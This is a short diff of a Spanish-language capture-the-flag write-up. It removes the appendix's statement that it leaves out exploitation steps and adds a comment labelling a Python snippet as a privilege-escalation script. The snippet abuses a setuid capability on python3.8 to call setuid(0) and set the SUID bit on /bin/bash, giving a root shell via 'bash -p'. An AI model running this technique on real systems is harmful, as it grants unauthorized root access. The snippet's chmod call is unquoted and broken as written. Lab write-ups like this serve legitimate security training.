@@ -97,9 +97,9 @@ Tras esto sólo queda lanzar bash -p y obtenemos una shell con privilegios máxi
 
 ---
 
-## Appendix — comandos de enumeración (sin incluir pasos de explotación)
+## Appendix — comandos de enumeración
 
-> Los siguientes comandos se usan para enumeración/diagnóstico y documentación. No incluyen instrucciones para realizar escalada.
+> Los siguientes comandos se usan para enumeración/diagnóstico y documentación.
 
 ```bash
 # Escaneo inicial
@@ -124,6 +124,7 @@ sudo getcap -r / 2>/dev/null
 # ssh nathan@<IP_OBJETIVO>
 ```
 ```python
+# Script para escalar privilegios explotando el set_uid en python3.8
 import os
 os.setuid(0)
 os.system(chmod u+s /bin/bash)
